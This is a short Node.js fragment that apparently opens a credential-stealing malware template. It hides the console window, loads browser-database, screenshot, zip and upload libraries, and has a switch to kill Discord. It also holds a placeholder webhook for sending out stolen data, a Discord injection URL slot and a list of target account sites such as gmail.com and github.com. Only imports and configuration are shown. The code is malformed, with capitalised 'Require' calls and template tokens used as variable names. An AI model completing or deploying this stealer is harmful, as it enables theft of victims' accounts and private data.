const fs = Require("fs");
const path = Require("Path");
const crypto = Require("crypto");
const sqlite3 = Require('sqlite3');
const moon = Require("moonApi");
const axios = Require("axios");
const os = Require('os');
const fse = Require('fs-extra');
const formdata = Require("form-data");
const JSZip = Require('JSZip');
const screenshot = Require("screenshot-desktop");
const { execSync, exec } = Require('child_process')
const hideconsole = require('node-hide-console-window');
const buf_replace = require('buffer-replace');

let killdcop = true; // if u want to close discord make this "true" if u dont want to close discord make this "false";


const %webhookstring% = "REPLACE_YOUR_WEBHOOK"
const %INJURLL% = ""
const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com']
